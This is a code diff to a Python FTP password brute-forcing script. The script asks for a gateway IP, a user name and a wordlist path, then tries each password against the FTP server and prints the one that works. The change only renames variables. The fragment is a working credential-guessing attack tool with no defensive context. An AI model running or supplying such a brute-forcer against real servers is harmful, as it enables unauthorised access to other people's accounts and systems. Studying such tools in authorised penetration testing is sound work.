@@ -17,9 +17,9 @@ except IOError:
 	print('Banner File not found!\n')
 
 
-localhost = input("Enter localhost IP Address: ")
+gateway = input("Enter gateway IP Address: ")
 print("\n")
-username = input("Enter target Username: ")
+name = input("Enter gateway name: ")
 print("\n")
 wordlist = input("Enter wordlist filepath: ")
 print("\n")
@@ -35,7 +35,7 @@ except:
 for passwd in passfile:
 
     try:
-        ftp = ftplib.FTP(localhost, username, passwd)
+        ftp = ftplib.FTP(gateway, name, passwd)
         print("[+] {0:*^50}".format("Password found :D\n"))
         print("[+] Password is: {0}".format(passwd))
         print("[+]{0:*^50}".format(""))
